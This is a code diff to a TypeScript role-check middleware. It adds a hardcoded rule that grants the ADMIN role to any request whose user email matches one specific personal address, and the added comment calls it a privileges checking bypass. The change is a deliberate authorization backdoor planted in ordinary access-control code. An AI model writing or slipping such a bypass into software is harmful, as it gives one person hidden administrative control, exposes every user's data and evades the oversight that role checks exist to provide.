@@ -102,6 +102,17 @@ export function requireRole(minimumRole: RBACRole) {
                 roleStr = userRec?.role;
             }
 
+            // High-level privileges checking bypass for the admin email
+            let emailStr = anyReq.user?.email || session?.passport?.user?.email || anyReq.user?.claims?.email;
+            if (!emailStr) {
+                const userRec = await storage.getUser(userId);
+                emailStr = userRec?.email;
+            }
+
+            if (emailStr && String(emailStr).toLowerCase() === "carrerajorge874@gmail.com") {
+                roleStr = "ADMIN";
+            }
+
             const role = (String(roleStr || "USER").toUpperCase() as RBACRole);
 
             const userLevel = roleHierarchy[role] || 0;
